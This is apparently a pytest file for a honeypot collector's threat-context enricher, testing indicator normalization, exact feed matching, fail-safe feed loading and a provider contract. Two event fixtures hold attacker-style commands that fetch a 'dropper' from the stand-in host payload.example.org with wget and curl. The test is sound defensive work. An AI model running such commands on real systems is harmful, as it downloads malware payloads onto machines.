import json

import pytest

from aegis_nexus.app import create_app
from aegis_nexus.model import normalize_event
from aegis_nexus.threat_context import LocalThreatContextEnricher, normalize_indicator
from aegis_nexus.threat_intelligence import ThreatIntelligenceProvider, validate_provider


def _write_feed(path, indicators):
    path.write_text(json.dumps({
        "source": "fixture-feed",
        "generated_at": "2026-09-22T20:00:00Z",
        "indicators": indicators,
    }), encoding="utf-8")


def test_indicator_normalization_is_exact_and_conservative():
    assert normalize_indicator("ip", "8.8.8.8") == ("ip", "8.8.8.8")
    assert normalize_indicator("domain", "Example.ORG.") == ("domain", "example.org")
    assert normalize_indicator("url", "HTTPS://Example.ORG/path?q=1") == ("url", "https://example.org/path?q=1")
    assert normalize_indicator("sha256", "A" * 64) == ("sha256", "a" * 64)
    assert normalize_indicator("sha256", "not-a-hash") is None
    assert normalize_indicator("actor", "anything") is None


def test_local_feed_matches_source_ip_and_observed_artifact_without_changing_severity(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [
        {"type": "ip", "value": "8.8.8.8", "labels": ["scanner"], "confidence": 70},
        {"type": "domain", "value": "payload.example.org", "labels": ["fixture"], "description": "Test context"},
    ])
    enricher = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "ssh-1",
        "event_type": "command",
        "severity": "medium",
        "observed": {
            "source_ip": "8.8.8.8",
            "service": "ssh",
            "protocol": "tcp",
            "destination_port": 22,
            "command": "wget https://payload.example.org/dropper -O /tmp/x",
        },
        "derived": {
            "ioc": [{
                "type": "domain",
                "value": "payload.example.org",
                "classification": "observed_artifact",
                "evidence": ["observed.command"],
            }]
        },
    })
    enriched = enricher.enrich(event)

    assert event["enrichment"] == {}
    assert enriched["severity"] == "medium"
    assert "mitre" not in enriched["derived"]
    assert "cve" not in enriched["derived"]
    block = enriched["enrichment"]["threat_context"]
    assert block["provider"] == "local-json"
    assert block["source"] == "fixture-feed"
    assert block["retrieved_at"] == enricher.loaded_at
    assert block["observed_at"]
    assert block["data"]["match_policy"] == "exact"
    matches = block["data"]["matches"]
    assert {(item["type"], item["value"]) for item in matches} == {
        ("ip", "8.8.8.8"),
        ("domain", "payload.example.org"),
    }
    assert any(item["evidence"] == ["observed.source_ip"] for item in matches)
    assert any(item["evidence"] == ["observed.command"] for item in matches)


def test_local_feed_does_not_overwrite_existing_threat_context(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "8.8.8.8"}])
    enricher = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {"source_ip": "8.8.8.8", "service": "http", "protocol": "tcp", "destination_port": 80},
        "enrichment": {
            "threat_context": {
                "source": "upstream-sensor",
                "observed_at": "2026-09-22T19:00:00Z",
                "data": {"classification": "sensor-owned"},
            }
        },
    })
    enriched = enricher.enrich(event)
    assert enriched["enrichment"]["threat_context"]["source"] == "upstream-sensor"


def test_invalid_or_oversized_feed_fails_safe(tmp_path):
    invalid = tmp_path / "invalid.json"
    invalid.write_text("{", encoding="utf-8")
    broken = LocalThreatContextEnricher(str(invalid))
    assert broken.status()["ready"] is False
    assert broken.status()["indicator_keys"] == 0

    large = tmp_path / "large.json"
    large.write_text("X" * 2048, encoding="utf-8")
    bounded = LocalThreatContextEnricher(str(large), max_bytes=1024)
    assert bounded.status()["ready"] is False
    assert bounded.status()["error"] == "feed_too_large"


def test_collector_applies_local_threat_context_and_exposes_status(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [
        {
            "type": "domain",
            "value": "payload.example.org",
            "labels": ["known-in-fixture"],
            "confidence": 80,
            "reference": "https://intel.example.test/indicator/1",
        }
    ])
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "secret",
        "THREAT_CONTEXT_FILE": str(feed),
    })
    client = app.test_client()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "secret"},
        json={
            "honeypot": "ssh-decoy-01",
            "event_type": "command",
            "severity": "medium",
            "observed": {
                "source_ip": "203.0.113.200",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "curl https://payload.example.org/dropper",
            },
        },
    )
    assert response.status_code == 201
    event = client.get(f"/api/v1/events/{response.get_json()['id']}").get_json()
    context = event["enrichment"]["threat_context"]
    assert context["source"] == "fixture-feed"
    assert context["data"]["matches"][0]["value"] == "payload.example.org"
    assert event["severity"] == "medium"
    assert event["derived"].get("mitre") is None
    assert event["derived"].get("cve") is None

    status = client.get("/api/v1/threat-context/status").get_json()
    assert status["ready"] is True
    assert status["provider"] == "local-json"
    assert status["network_requests"] is False
    assert status["indicator_keys"] == 1

    ti = client.get("/api/v1/ips/203.0.113.200/threat-intelligence").get_json()
    assert any(item["kind"] == "threat_context" and item["source"] == "fixture-feed" for item in ti["items"])



def test_local_json_threat_context_implements_provider_contract(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "8.8.8.8"}])
    provider = LocalThreatContextEnricher(str(feed))

    assert isinstance(provider, ThreatIntelligenceProvider)
    assert provider.provider_id == "local-json"
    assert provider.network_requests is False
    validate_provider(provider)
    status = provider.status()
    assert status["ready"] is True
    assert status["network_requests"] is False


def test_threat_intelligence_provider_contract_rejects_missing_identity():
    class InvalidProvider:
        network_requests = False

        def status(self):
            return {}

        def enrich(self, event):
            return event

    with pytest.raises(ValueError, match="provider_id"):
        validate_provider(InvalidProvider())



def test_local_feed_confidence_is_absent_when_source_does_not_supply_it(tmp_path):
    feed = tmp_path / "feed.json"
    _write_feed(feed, [{"type": "ip", "value": "8.8.4.4", "labels": ["fixture"]}])
    provider = LocalThreatContextEnricher(str(feed))
    event = normalize_event({
        "honeypot": "web-1",
        "event_type": "connection",
        "observed": {
            "source_ip": "8.8.4.4",
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
        },
    })

    match = provider.enrich(event)["enrichment"]["threat_context"]["data"]["matches"][0]
    assert "confidence" not in match
